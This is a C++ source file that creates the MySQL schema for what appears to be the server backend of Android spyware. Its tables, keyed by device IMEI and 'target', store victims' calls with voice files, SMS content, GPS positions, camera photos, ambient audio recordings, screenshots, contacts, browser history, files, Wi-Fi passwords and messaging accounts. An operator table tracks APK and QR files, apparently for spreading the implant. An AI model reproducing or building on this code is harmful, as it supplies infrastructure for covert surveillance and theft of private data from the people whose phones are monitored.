
#include "DBCreator.h"
#include "mysqlOper.h"

#include <iostream>


using namespace std;

int DBCreator::createaccount() {
#ifdef USE_MYSQL
	MySql* mysql = new MySql();

	string cmd = "CREATE TABLE ph_accounts ("
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"client_id int(11) NOT NULL,"
		"qq text,"
		"wx text,"
		"skype text,"
		"telegram text,"
		"other text,"
		"PRIMARY KEY (id),"
		"KEY client_id (client_id)"
		") DEFAULT CHARSET = utf8 ";

	bool ret = mysql->createdbTable(cmd.c_str());
	delete mysql;
#endif
	return 0;
}


int DBCreator::createdb() {
#ifdef USE_MYSQL
	char* szinfo = new char[4096];
	MySql* mysql = new MySql();

	string phoneclients =
		"CREATE TABLE phone_clients ("
		"target int(11) NOT NULL DEFAULT 0,"
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"imei varchar(50) NOT NULL,"
		"name varchar(50) DEFAULT NULL,"
		"update_ts int(11) DEFAULT NULL,"
		"model varchar(255) DEFAULT NULL,"
		"state tinyint(4) DEFAULT 1 COMMENT \'1:正常\r\n0：销毁\',"
		"infos text,"
		//"group int(11) NOT NULL DEFAULT 0,"
		"PRIMARY KEY(id),"
		"UNIQUE KEY imei(imei) ,"
		"KEY target(target) ,"
		"KEY id(id)"
		")  DEFAULT CHARSET = utf8; ";

	bool ret = mysql->createdbTable(phoneclients.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}


	string applist = "CREATE TABLE ph_applist ("
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"client_id int(11) NOT NULL,"
		"name varchar(100) DEFAULT NULL,"
		"package varchar(255) DEFAULT NULL,"
		"version varchar(50) DEFAULT NULL,"
		"ctime varchar(20) DEFAULT NULL,"
		"utime varchar(20) DEFAULT NULL,"
		"type tinyint(4) DEFAULT NULL,"
		"PRIMARY KEY(id),"
		"KEY client_id(client_id)"
		")DEFAULT CHARSET = utf8; ";

	ret = mysql->createdbTable(applist.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}





	string bookmark = "CREATE TABLE ph_bookmark ("
		"client_id int(11) NOT NULL,"
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"url text,"
		"title text,"
		"count int(11) DEFAULT NULL,"
		"ctime int(11) DEFAULT NULL,"
		"PRIMARY KEY(id),"
		"KEY client_id(client_id)"
		")  DEFAULT CHARSET = utf8; ";

	ret = mysql->createdbTable(bookmark.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}



	string callrecord = "CREATE TABLE ph_call_record ("
		"client_id int(11) NOT NULL,"
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"name varchar(50) DEFAULT NULL,"
		"number varchar(30) DEFAULT NULL,"
		"type tinyint(4) DEFAULT NULL COMMENT \'1：呼入\r\n2：呼出\',"
		"ts int(1) DEFAULT NULL,"
		"duration int(1) DEFAULT NULL,"
		"voice_file varchar(255) DEFAULT NULL,"
		"PRIMARY KEY(id),"
		"KEY client_number(client_id, number, type)"
		")  DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(callrecord.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string camera = "CREATE TABLE ph_camera ("
		"client_id int(11) NOT NULL,"
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"ts int(11) DEFAULT NULL,"
		"type tinyint(4) DEFAULT NULL COMMENT \'0:前置\r\n1：后置\',"
		"img_file varchar(255) DEFAULT NULL,"
		"PRIMARY KEY(id),"
		"KEY client_id(client_id)"
		")  DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(camera.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string contacts = "CREATE TABLE ph_contacts ("
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"client_id int(11) NOT NULL,"
		"name varchar(30) DEFAULT NULL,"
		"number varchar(30) NOT NULL,"
		"PRIMARY KEY(id),"
		"KEY client_id(client_id) "
		")  DEFAULT CHARSET = utf8 ; ";
	ret = mysql->createdbTable(contacts.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string envaudio = "CREATE TABLE ph_env_record ("
		"client_id int(11) NOT NULL,"
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"ts int(11) DEFAULT NULL,"
		"duration int(11) DEFAULT NULL,"
		"voice_file varchar(255) DEFAULT NULL,"
		"PRIMARY KEY(id),"
		"KEY client_id(client_id)"
		") DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(envaudio.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string files = "CREATE TABLE ph_files ("
		"client_id int(11) NOT NULL,"
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"type tinyint(4) DEFAULT NULL,"
		"name varchar(200) DEFAULT NULL,"
		"path text,"
		"size int(11) DEFAULT NULL,"
		"PRIMARY KEY(id),"
		"KEY client_id(client_id, type) "
		") DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(files.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string loc = "CREATE TABLE ph_gps_info ("
		"client_id int(11) NOT NULL,"
		"ts int(11) NOT NULL,"
		"lat float(10, 5) DEFAULT NULL COMMENT \'高德坐标系\',"
		"lon float(10, 5) DEFAULT NULL COMMENT \'高德坐标系\',"
		"gps varchar(50) DEFAULT NULL COMMENT \'原始gps数据\r\n格式为  lat, lon\',"
		"addr text,"
		"PRIMARY KEY(client_id, ts),"
		"KEY client_id(client_id)"
		")  DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(loc.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string message = "CREATE TABLE ph_msg_record ("
		"client_id int(11) NOT NULL,"
		"mid int(11) NOT NULL,"
		"name varchar(255) DEFAULT NULL,"
		"number varchar(30) DEFAULT NULL,"
		"type tinyint(4) DEFAULT NULL COMMENT \'1：接收\r\n2：发送\',"
		"ts int(11) DEFAULT NULL,"
		"content text,"
		"PRIMARY KEY(client_id, mid),"
		"KEY client_number(client_id, number)"
		") DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(message.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string process = "CREATE TABLE ph_proc ("
		"client_id int(11) NOT NULL,"
		"pid int(11) NOT NULL,"
		"name varchar(255) DEFAULT NULL,"
		"userid int(11) DEFAULT NULL,"
		"PRIMARY KEY(client_id, pid),"
		"KEY client_id(client_id, name(191))"
		") DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(process.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string sdcard = "CREATE TABLE ph_sd_files ("
		"client_id int(11) NOT NULL,"
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"parent int(11) DEFAULT NULL,"
		"type tinyint(4) DEFAULT NULL COMMENT \'0: dir\r\n1: file\',"
		"name varchar(255) DEFAULT NULL,"
		"size int(11) DEFAULT NULL,"
		"mtime int(11) DEFAULT NULL,"
		"path text,"
		"PRIMARY KEY(id),"
		"KEY client_id(client_id, parent),"
		"KEY parent(parent)"
		") DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(sdcard.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string screencap = "CREATE TABLE ph_snapshot ("
		"client_id int(11) NOT NULL,"
		"id int(11) NOT NULL AUTO_INCREMENT,"
		//"group int(11) DEFAULT NULL,"
		"ts int(11) DEFAULT NULL,"
		"img_file varchar(255) DEFAULT NULL,"
		"PRIMARY KEY(id)"
		//"KEY client_id(client_id, group) "
		")  DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(screencap.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string wifi = "CREATE TABLE ph_wifi_info ("
		"client_id int(11) NOT NULL,"
		"list text,"
		"password text,"
		"PRIMARY KEY(client_id),"
		"KEY client_id(client_id)"
		") DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(wifi.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string webrecord = "CREATE TABLE ph_web_record ("
		"client_id int(11) NOT NULL,"
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"ts int(11) DEFAULT NULL,"
		"url text,"
		"title text,"
		"count int(11) DEFAULT NULL,"
		"ctime int(11) DEFAULT NULL,"
		"PRIMARY KEY(id),"
		"KEY client_id(client_id, ts)"
		")  DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(webrecord.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	string users = "CREATE TABLE users ("
		"id int(11) NOT NULL AUTO_INCREMENT,"
		"name varchar(50) DEFAULT NULL,"
		"pwd varchar(100) DEFAULT NULL,"
		"tname varchar(50) DEFAULT NULL,"
		"state tinyint(4) DEFAULT 10,"
		"apk_file varchar(255) DEFAULT NULL,"
		"qr_file varchar(255) DEFAULT NULL,"
		"PRIMARY KEY(id),"
		"UNIQUE KEY name(name) ,"
		"UNIQUE KEY tname(tname) "
		")  DEFAULT CHARSET = utf8; ";
	ret = mysql->createdbTable(users.c_str());
	if (ret == false)
	{
		mysql->errorIntoMySQL();
		wsprintfA(szinfo, "error:%u,description:%s\r\n", mysql->errorNum, mysql->errorInfo);
	}

	delete mysql;
#endif
	return 0;
}